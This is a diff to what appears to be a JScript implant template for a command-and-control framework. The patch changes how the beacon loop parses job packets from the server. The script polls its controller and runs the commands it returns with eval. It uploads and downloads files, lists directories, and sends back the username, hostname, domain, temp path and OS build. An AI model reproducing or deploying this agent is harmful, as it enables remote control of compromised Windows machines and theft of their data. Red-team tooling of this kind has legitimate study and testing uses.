@@ -29,7 +29,7 @@ function post(data){
 
 while (true) {
   try {
-      eval("jobs=" + post(response).responseText + ";");
+      eval("json_object=" + post(response).responseText + ";");
   } catch (e) {
       var response = '[["{{ check_in_job_id }}"]]';
       WScript.Sleep(sleep);
@@ -37,41 +37,44 @@ while (true) {
   }
   try {
       response = '[';
-      for (var key in jobs) {
-          eval("args=" + jobs[key][1] + ";");
+      jobs = json_object.job_packet
+      for (var job in jobs) {
+          var id = jobs[job].id
+          var name = jobs[job].name
+          var args = jobs[job].arguments.toString().split(',');
           try{
               var results = '';
-              if ('upload' === jobs[key][0]) {
+              if ('upload' === name) {
                   results = upload(b64d(args[0], "bin"), b64d(args[1]));
               }
-              if ('download' === jobs[key][0]) {
+              if ('download' === name) {
                   results = download(b64d(args[0]));
               }
-              if ('dir' === jobs[key][0]) {
+              if ('dir' === name) {
                   results = dir(b64d(args[0]));
               }
-              if ('whoami' === jobs[key][0]) {
+              if ('whoami' === name) {
                   results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
               }
-              if ('tmp' === jobs[key][0]) {
+              if ('tmp' === name) {
                   results = b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%"));
               }
-              if ('hostname' === jobs[key][0]) {
+              if ('hostname' === name) {
                   results = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
               }
-              if ('domain' === jobs[key][0]) {
+              if ('domain' === name) {
                   results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%"));
               }
-              if ('os' === jobs[key][0]) {
+              if ('os' === name) {
                   results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
               }
-              if ('sleep' === jobs[key][0]) {
+              if ('sleep' === name) {
                   sleep = b64d(args[0]);
                   results = b64e('Sleep change to ' + sleep + ' milliseconds');
               }
-              response = response + '["' + key + '","' +  results + '"],';
+              response = response + '["' + id + '","' +  results + '"],';
           } catch (e) {
-             response = response + '["' + key + '","' + b64d("Job failed.") + '"],';
+             response = response + '["' + id + '","' + b64d("Job failed.") + '"],';
           }
       }
   } catch (e) {
